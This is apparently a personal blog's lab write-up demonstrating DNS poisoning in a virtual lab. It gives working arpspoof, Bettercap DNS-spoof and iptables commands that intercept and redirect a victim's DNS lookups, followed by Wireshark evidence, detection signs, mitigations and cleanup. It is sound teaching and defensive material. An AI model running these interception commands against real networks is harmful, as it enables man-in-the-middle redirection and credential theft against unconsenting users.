---
title: "DNS POISONING"
date: 2025-11-02
layout: single
categories: [Labs]
tags: [DNS, Poisoning, MITM, Wireshark]
excerpt: "Demonstration of DNS poisoning in a controlled lab environment, including analysis, indicators, and mitigation strategies."
permalink: /labs/dns-poisoning/
header:
  teaser: /assets/images/dns-poisoning/DNS-POST.jpg
  image: /assets/images/dns-poisoning/DNS-POST.jpg
  overlay_filter: 0.3
  overlay_image: /assets/images/dns-poisoning/DNS-POST.jpg
  image_description: "A small crack in trust can open the door to deception — DNS poisoning in action."
  image_height: 300px
author_profile: true
---

# DNS POISONING

## Overview

This project demonstrates **DNS Poisoning** — an attack technique that manipulates DNS responses to redirect the traffic from legitimate servers to malicious ones.

The lab is divided into three parts:

1. **Baseline A:** Normal DNS communication.
2. **Baseline B:** DNS poisoning demonstration.
3. **Mitigation:** Preventing and cleaning up after the attack.

All tests were performed inside a **Proxmox** lab using virtual machines on the same virtual network bridge.

## Lab Setup

| Role                 | Hostname         | Description                                      |
| -------------------- | ---------------- | ------------------------------------------------ |
| **WINDOWS10_VICTIM** | Test target      | Windows 10 client performing DNS lookups         |
| **KALI_ATTACKER**    | Attacker machine | Runs Bettercap and ARP spoofing scripts          |
| **DNS_SERVER**       | Raspberry Pi     | Local DNS resolver using _dnsmasq_               |
| **UBUNTU_SERVER**    | Web/file server  | Legitimate site hosted at `portal.company.local` |

## What is DNS Poisoning?

DNS poisoning (or DNS spoofing) is an attack in which an adversary forges DNS responses so that a legitimate domain name resolves to a **malicious IP address**.

When a user tries to access a trusted domain, they are silently redirected to the attacker’s host, which can:

- Serve fake or malicious web pages
- Capture credentials
- Inject ads or scripts
- Support other MITM attacks (for example, combined with ARP spoofing)

**Common attacker goals:**

- Malware distribution
- Traffic redirection for monetization
- Credential theft
- Traffic monitoring or disruption
- Bypassing geographical or security restrictions

## Indicators of DNS Poisoning

- Redirection to unfamiliar or suspicious websites
- Browser warnings about invalid TLS certificates
- Inconsistent DNS answers between resolvers
- Duplicate or delayed DNS responses
- User reports of altered content

## Prerequisites

Before starting, prepare the following:

1. **DNS Server** (Raspberry Pi or Linux VM) – our `DNS_SERVER`.
2. **Attacker VM (Kali)** – our `KALI_ATTACKER`.
3. **Victim VM (Windows 10)** – configured to use **only** `DNS_SERVER` as its DNS resolver.
   - Confirm in Command Prompt:
     ```
     ipconfig /all
     ```
     Ensure the _DNS Servers_ line shows only your Raspberry Pi’s IP.

## Baseline A – Normal DNS Resolution

On the Ubuntu server (`UBUNTU_SERVER`), a site `portal.company.local` was hosted. This hostname was added to **dnsmasq.conf** on the Raspberry Pi DNS server.

![Baseline A - dnsmasq.conf screenshot](/assets/images/dns-poisoning/RASPBERRY_PI_DNSMASQ.CONF_BASE_A.png)

When running:

```
nslookup portal.company.local
```

on the Windows 10 victim, the correct IP (the Ubuntu server) was returned — confirming normal DNS behavior.
![Baseline A - NSLOOKUP screenshot](/assets/images/dns-poisoning/BASE_A_NSLOOKUP_W10_TO_UBUNTU_BASE_A.png)

## Baseline B – DNS Poisoning Attack

We use **Bettercap** on Kali to intercept and spoof DNS replies.

### Step 1 – Start ARP spoofing

Redirect the traffic between victim and the DNS server through the attacker:

```bash
sudo arpspoof -i eth0 192.168.0.53 192.168.0.30
sudo arpspoof -i eth0 192.168.0.30 192.168.0.53
```

Confirm that the Windows ARP table shows the same MAC for the DNS server and the attacker — this indicates ARP spoofing is active.

![Baseline B - WINDOWS10_VICTIM_ARP_TABLE screenshot](/assets/images/dns-poisoning/ARP_TABLE_WINDOWS10_ARP_SPOOF_BASE_B.png)

### Step 2 – Launch DNS spoofing

```bash
sudo bettercap -iface eth0 -eval "
set dns.spoof.domains portal.company.local;
set dns.spoof.address KALI_ATTACKER;
set dns.spoof.all true;
arp.spoof on;
dns.spoof on;
events.stream on;"
```

You can add "set arp.spoof.targets WINDOWS10_VICTIM,DNS_SERVER;
set arp.spoof.fullduplex true;" to your bettercap script. In my lab this did not work reliably, which is why I performed ARP spoofing separately with arpspoof. Now, when the victim queries `portal.company.local`, the DNS reply comes **from the attacker**, not the legitimate DNS server.

### Step 3 – Block legitimate DNS responses (iptables)

To ensure the victim only sees the attacker's replies, block the DNS server’s responses, from KALI_ATTACKER machine type:

```bash
sudo iptables -I FORWARD -p udp -s DNS_SERVER --sport 53 -d WINDOWS10_VICTIM -j DROP
sudo iptables -I FORWARD -p tcp -s DNS_SERVER --sport 53 -d WINDOWS10_VICTIM -j DROP
```

This prevents the Raspberry Pi’s DNS replies from reaching the victim and forces the attacker’s spoofed answer to be the only response received.

---

### ✅ Result

On the WINDOWS10_VICTIM, `nslookup portal.company.local` returns:

![Baseline B - NSLOOKUP_WINDOWS10_DNS_POISONING screenshot](/assets/images/dns-poisoning/NSLOOKUP_W10_BASE_B.png)

The legitimate Ubuntu server IP no longer appears — the attack succeeded. The IPv6-mapped format indicates unusual network interference and is a detection clue.

## Evidence images

### Wireshark capture of poisoned DNS responses redirecting the victim to the attacker’s IP.

![Baseline B - WIRESHARK_DNS_POISONING_DNS_FILTER screenshot](/assets/images/dns-poisoning/WIRESHARK_KALI_DNS_BASEB.png)

### ICMP Redirects observed during the DNS poisoning

![Baseline B - WIRESHARK_DNS_POISONING_DNS_FILTER screenshot](/assets/images/dns-poisoning/WIRESHARK_KALI_BASE_B.png)

<!-- This capture was taken on the attacker (`KALI_ATTACKER`) while the Windows 10 victim requested `portal.company.local`. Each row is an ICMP **Redirect (for host)** message where the attacker is the source and the destination alternates between the victim and the DNS server. The attacker is injecting redirect messages to change routing decisions so traffic is routed through the attacker — an extra interception technique that complements ARP and DNS-spoofing. -->

<!-- **Why this matters:**
ICMP redirects are normally sent by legitimate routers to optimize routing. When a non-router (an unexpected host) starts sending them, it’s suspicious. In this lab the attacker uses ICMP redirects to force hosts to route traffic via the attacker, helping intercept DNS queries/responses and other traffic even if ARP spoofing alone is unreliable. Frequent redirects from an unexpected host are a strong detection signal. -->

## **Detection & mitigation:**

- **Detect**
  - Alert on ICMP Redirects from hosts that are not legitimate routers/gateways.
  - Correlate ICMP Redirect alerts with ARP table changes and unexpected DNS answers.
  - Monitor for unusual frequencies of ICMP Type 5 messages.
- **Immediate mitigation**
  - Disable acceptance of ICMP redirects on endpoints:
    - Linux: `sudo sysctl -w net.ipv4.conf.all.accept_redirects=0`
    - Windows: use registry or network settings to disable ICMP redirects acceptance.
- **Long-term**
  - Enforce network segmentation and ensure only trusted routers can send redirects.
  - Use DNSSEC and DoH/DoT where possible.
  - Harden ARP/DHCP through network controls and monitor routing anomalies.

## Cleanup Steps

After testing, revert your environment:

### On Kali:

```bash
sudo iptables -D FORWARD -p udp -s 192.168.0.53 --sport 53 -d 192.168.0.30 -j DROP
sudo iptables -D FORWARD -p tcp -s 192.168.0.53 --sport 53 -d 192.168.0.30 -j DROP
sudo pkill -9 bettercap
sudo pkill -9 -f "sudo bettercap"
```

### On Windows 10 Victim:

```bash
netsh interface ip set dns "Ethernet" dhcp
ipconfig /flushdns
nslookup portal.company.local
```

### On Raspberry Pi:

```bash
sudo systemctl restart dnsmasq
```

After cleanup, the victim should resolve `portal.company.local` to the Ubuntu server again.

## How to Prevent DNS Poisoning

### For Users

- Flush local DNS cache when suspecting poisoning.
- Use **DNS-over-HTTPS (DoH)** or **DNS-over-TLS (DoT)** with trusted resolvers (Cloudflare, Google).
- Keep systems updated and verify hosts files.
- Prefer HTTPS — certificate validation will warn users about spoofed endpoints.
- Use a VPN that enforces trusted DNS resolvers.

### For Administrators

- Enable **DNSSEC** for signed DNS validation.
- Protect domain registrar accounts with MFA and strict controls.
- Monitor DNS records and limit zone transfers.
- Use reputable DNS providers and monitoring tools.
- Enforce **HTTPS + HSTS** on web services.

## Conclusion

This lab demonstrates a practical DNS poisoning attack in a controlled environment. It shows:

- How an attacker can redirect the traffic via forged DNS replies.
- The real artifacts that defenders can use to detect the attack.
- How to clean up and what mitigations are effective.
